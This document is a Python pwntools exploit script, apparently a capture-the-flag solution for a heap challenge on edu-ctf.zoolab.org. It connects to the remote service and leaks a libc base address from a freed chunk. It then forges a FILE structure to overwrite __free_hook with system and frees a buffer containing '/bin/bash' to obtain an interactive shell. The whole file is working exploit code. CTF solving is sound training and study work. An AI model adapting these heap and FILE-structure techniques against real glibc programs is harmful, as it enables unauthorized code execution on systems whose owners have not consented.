import pwn
#proc = pwn.process(["./chal"])
proc = pwn.remote("edu-ctf.zoolab.org", 10011)
def sendindex(idx:int):
    proc.sendlineafter(b"index\n> ", str(idx).encode())

def sendsz(sz:int):
    proc.sendlineafter(b"size\n> ", str(sz).encode())

def add_user(idx:int, username = "a" * 16):
    proc.sendafter(b"> ", b"1")
    sendindex(idx)
    proc.sendafter(b"username\n> ", username.encode())
    proc.recvuntil(b"success!\n")

def edit_user(idx:int, sz:int, data:bytes):
    proc.sendafter(b"> ", b"2")
    sendindex(idx)
    sendsz(sz)
    from time import sleep
    sleep(0.2)
    proc.send(data)
    proc.recvuntil(b"success!\n")

def del_user(idx:int):
    proc.sendafter(b"> ", b"3")
    sendindex(idx)
    proc.recvuntil(b"success!\n")


def main():
    # leaking libc base
    add_user(0)
    edit_user(0, 0x10, b"a"*0x10)
    add_user(1, "b"* 16)
    # 0x30 0x1e0 in tcache
    # 0x1010 in unsorted bin
    del_user(0)
    # obtain previous freed unsorted bin chunk
    edit_user(1, 0x199, b"s"*9)
    proc.sendlineafter(b"> ", b"4")
    raw_msg = proc.recvuntil(b"1.")
    print(raw_msg)
    leak_addr = pwn.u64(b"\x00" + raw_msg[20:25] + b"\x00" * 2)
    print(f"leaked addr: {hex(leak_addr)}")
    libc_base = leak_addr - 2019840
    print(f"libc base: {hex(libc_base)}")
    free_hook = libc_base + 2027080
    print(f"free hook addr: {hex(free_hook)}")
    add_user(2)
    edit_user(2, 24, b"z"*24)
    add_user(3)
    edit_user(3, 24, b"y"*24)
    
    # 0x30 0x1e0 in tcache
    # 1 chunk in unsorted bin
    # 1 chunk in large bin
    del_user(2)
    
    payload = b""
    payload += 0xfbad0000.to_bytes(8, "little")      # flags
    payload += b"\x00" * 8                           # read_ptr 
    payload += b"\x00" * 8                           # read_end
    payload += b"\x00" * 8                           # read_base 
    payload += b"\x00" * 8                           # write_base 
    payload += b"\x00" * 8                           # write_ptr 
    payload += b"\x00" * 8                           # write_end
    payload += (free_hook).to_bytes(8, "little")        # buf_base
    payload += (free_hook + 0x87).to_bytes(8, "little") # buf_end
    payload += b"\x00" * 8 * 5 # save_base + backup_base + save_end + markers + chain
    payload += int(0).to_bytes(8, "little")          # fd
    payload += b"\x00" * 8 * 2
    #payload += (0x1e0 - 16 + 8 - len(payload)) * b"\x00"

    # obtain 2's FILE* & set write addr to __free_hook
    edit_user(3, 0x1e0 - 16 + 8, payload)
    proc.sendlineafter(b"> ", b"4")
    data = 405 * b"z" + pwn.p64(336528 + libc_base)
    print(f"system addr:{hex(336528 + libc_base)}")
    data += (0x200 - len(data)) * b"a"
    # since duplicated pointer :P
    proc.sendafter(b"data: ", data)
    proc.sendafter(b"data: ", data)
    
    # trigger free hook
    add_user(0, "/bin/bash")
    proc.sendafter(b"> ", b"3")
    sendindex(0)
    proc.interactive()

if __name__ == "__main__":
    main()